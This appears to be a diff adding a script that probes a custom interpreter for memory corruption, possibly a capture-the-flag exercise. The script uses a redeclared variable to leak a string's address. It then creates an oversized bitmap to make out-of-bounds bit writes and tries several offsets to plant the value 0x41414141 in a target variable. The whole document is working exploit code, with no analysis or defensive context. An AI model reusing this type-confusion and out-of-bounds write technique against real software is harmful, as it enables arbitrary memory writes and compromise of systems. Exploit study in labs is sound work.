@@ -1,0 +1,143 @@
+print("=== Find Correct Address Offset ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Testing different entry address offsets:");
+print("We'll try: -0x100, -0x200, -0x300, -0x400, -0x500");
+
+print("Creating bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Test 1: entry_addr = targetaddr - 0x100 (256)");
+int entry1 = targetaddr - 256;
+int valueptr1 = entry1 + 40;
+int bitmapptr1 = targetaddr - 8192;
+int offset1 = valueptr1 - bitmapptr1;
+int bitindex1 = offset1 * 8;
+print("value_ptr_addr:");
+print(valueptr1);
+print("bit_index:");
+print(bitindex1);
+print("Writing test value...");
+set(b1, bitindex1 + 0, 0, 1);
+set(b1, bitindex1 + 6, 0, 1);
+set(b1, bitindex1 + 8, 0, 1);
+set(b1, bitindex1 + 14, 0, 1);
+set(b1, bitindex1 + 16, 0, 1);
+set(b1, bitindex1 + 22, 0, 1);
+set(b1, bitindex1 + 24, 0, 1);
+set(b1, bitindex1 + 30, 0, 1);
+int test1 = target;
+print("test1:");
+print(test1);
+if (test1 == 1094795585) {
+    print("SUCCESS! Offset -0x100 is correct!");
+} else {
+    print("Not correct, trying next offset...");
+}
+
+print("Test 2: entry_addr = targetaddr - 0x200 (512)");
+int entry2 = targetaddr - 512;
+int valueptr2 = entry2 + 40;
+int bitmapptr2 = targetaddr - 8192;
+int offset2 = valueptr2 - bitmapptr2;
+int bitindex2 = offset2 * 8;
+print("value_ptr_addr:");
+print(valueptr2);
+print("bit_index:");
+print(bitindex2);
+print("Clearing previous write and writing new test value...");
+set(b1, bitindex1 + 0, 0, 0);
+set(b1, bitindex1 + 6, 0, 0);
+set(b1, bitindex1 + 8, 0, 0);
+set(b1, bitindex1 + 14, 0, 0);
+set(b1, bitindex1 + 16, 0, 0);
+set(b1, bitindex1 + 22, 0, 0);
+set(b1, bitindex1 + 24, 0, 0);
+set(b1, bitindex1 + 30, 0, 0);
+set(b1, bitindex2 + 0, 0, 1);
+set(b1, bitindex2 + 6, 0, 1);
+set(b1, bitindex2 + 8, 0, 1);
+set(b1, bitindex2 + 14, 0, 1);
+set(b1, bitindex2 + 16, 0, 1);
+set(b1, bitindex2 + 22, 0, 1);
+set(b1, bitindex2 + 24, 0, 1);
+set(b1, bitindex2 + 30, 0, 1);
+int test2 = target;
+print("test2:");
+print(test2);
+if (test2 == 1094795585) {
+    print("SUCCESS! Offset -0x200 is correct!");
+}
+
+print("Test 3: entry_addr = targetaddr - 0x300 (768)");
+int entry3 = targetaddr - 768;
+int valueptr3 = entry3 + 40;
+int bitmapptr3 = targetaddr - 8192;
+int offset3 = valueptr3 - bitmapptr3;
+int bitindex3 = offset3 * 8;
+print("value_ptr_addr:");
+print(valueptr3);
+print("bit_index:");
+print(bitindex3);
+print("Clearing and writing...");
+set(b1, bitindex2 + 0, 0, 0);
+set(b1, bitindex2 + 6, 0, 0);
+set(b1, bitindex2 + 8, 0, 0);
+set(b1, bitindex2 + 14, 0, 0);
+set(b1, bitindex2 + 16, 0, 0);
+set(b1, bitindex2 + 22, 0, 0);
+set(b1, bitindex2 + 24, 0, 0);
+set(b1, bitindex2 + 30, 0, 0);
+set(b1, bitindex3 + 0, 0, 1);
+set(b1, bitindex3 + 6, 0, 1);
+set(b1, bitindex3 + 8, 0, 1);
+set(b1, bitindex3 + 14, 0, 1);
+set(b1, bitindex3 + 16, 0, 1);
+set(b1, bitindex3 + 22, 0, 1);
+set(b1, bitindex3 + 24, 0, 1);
+set(b1, bitindex3 + 30, 0, 1);
+int test3 = target;
+print("test3:");
+print(test3);
+if (test3 == 1094795585) {
+    print("SUCCESS! Offset -0x300 is correct!");
+}
+
+print("Test 4: entry_addr = targetaddr - 0x400 (1024)");
+int entry4 = targetaddr - 1024;
+int valueptr4 = entry4 + 40;
+int bitmapptr4 = targetaddr - 8192;
+int offset4 = valueptr4 - bitmapptr4;
+int bitindex4 = offset4 * 8;
+print("Clearing and writing...");
+set(b1, bitindex3 + 0, 0, 0);
+set(b1, bitindex3 + 6, 0, 0);
+set(b1, bitindex3 + 8, 0, 0);
+set(b1, bitindex3 + 14, 0, 0);
+set(b1, bitindex3 + 16, 0, 0);
+set(b1, bitindex3 + 22, 0, 0);
+set(b1, bitindex3 + 24, 0, 0);
+set(b1, bitindex3 + 30, 0, 0);
+set(b1, bitindex4 + 0, 0, 1);
+set(b1, bitindex4 + 6, 0, 1);
+set(b1, bitindex4 + 8, 0, 1);
+set(b1, bitindex4 + 14, 0, 1);
+set(b1, bitindex4 + 16, 0, 1);
+set(b1, bitindex4 + 22, 0, 1);
+set(b1, bitindex4 + 24, 0, 1);
+set(b1, bitindex4 + 30, 0, 1);
+int test4 = target;
+print("test4:");
+print(test4);
+if (test4 == 1094795585) {
+    print("SUCCESS! Offset -0x400 is correct!");
+}
+
+print("Note: If none match, might need to try different bitmap buffer offsets");
+print("or use OOB read to find exact addresses");
+
